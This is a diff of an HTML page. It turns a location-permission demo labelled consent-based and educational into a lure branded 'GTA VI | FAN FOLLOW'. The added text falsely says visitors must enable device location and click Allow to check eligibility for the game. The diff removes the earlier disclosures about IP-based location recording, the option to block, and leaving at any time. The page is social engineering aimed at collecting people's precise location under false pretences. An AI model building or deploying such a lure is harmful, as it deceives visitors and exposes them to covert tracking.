@@ -3,27 +3,36 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <meta name="theme-color" content="#080d18">
-  <title>Tracepoint | Visitor test</title>
+  <meta name="theme-color" content="#070a14">
+  <title>GTA VI | FAN FOLLOW</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800;900&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
+  <div class="ambient-bg" aria-hidden="true">
+    <span class="glow glow-sunset"></span>
+    <span class="glow glow-cyan"></span>
+    <span class="grid-overlay"></span>
+  </div>
+
   <main class="shell">
-    <div class="brand"><span class="brand-mark">T</span><span>TRACEPOINT</span></div>
+    <div class="brand"><span class="brand-mark">GTA</span><span>VI</span></div>
     <section class="card">
-      <div class="eyebrow">CONSENT-BASED DEMO</div>
+      <div class="eyebrow">GTA VI DOCUMENTARY WITH FAN FOLLOW</div>
       <div class="icon">⌖</div>
-      <h1>Location test</h1>
-      <p class="lead">You've been invited to try a small location-intelligence demonstration.</p>
+      <h1>FOLLOWING TEST</h1>
+      <p class="lead">You've been invited to try a small FAN FOLLOW for GTA VI.</p>
       <div class="notice">
         <strong>What happens when you continue?</strong>
-        <p>This page records an approximate location from your public IP address. It will also ask your browser for permission to share your device location, which may be more accurate.</p>
-        <p>Your precise location is sent only if you choose Allow in the browser's permission prompt. If you choose Block, only the approximate IP-based location is used. Your raw IP address is not saved in the project's database.</p>
+        <p>This page checks whether you are in an eligible country to Recieve Fan Follow and GTA VI.</p>
+        <p>Your precise location is need to check whether you are eligible or not. So please turn on your location on the device and reload the page. This will prompt a message to ask for location and click Allow For This Time or Allow.</p>
       </div>
-      <div id="status" class="status" role="status" aria-live="polite">Preparing your test link…</div>
-      <p class="small">You can deny the browser request or close this page at any time. Precise location is not collected unless you grant permission.</p>
+      <div id="status" class="status" role="status" aria-live="polite">Preparing your link.</div>
+      <p class="small">You have to Allow the Location Promt after turning on the Location setting on the device.</p>
     </section>
-    <footer>TRACEPOINT · EDUCATIONAL PROJECT</footer>
+    <footer>GTA VI - FAN FOLLOW</footer>
   </main>
 
   <div id="locationModal" class="modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
@@ -31,7 +40,7 @@
       <div class="modal-orbit"><span class="orbit-dot"></span><span class="orbit-core">⌖</span></div>
       <div class="modal-kicker">LOCATION PERMISSION</div>
       <h2 id="modalTitle">A quick heads-up</h2>
-      <p id="modalText">Your browser will ask whether you want to share your device location. You are in control — choose Allow or Block in the browser prompt.</p>
+      <p id="modalText">Your browser will ask whether you want to share your device location. You are in control — choose Allow to check whether if you are eligible.</p>
       <div class="permission-chip"><span class="pulse"></span><span id="modalState">Waiting for browser permission…</span></div>
       <div class="modal-foot">Precise location is shared only if you approve the browser request.</div>
     </section>
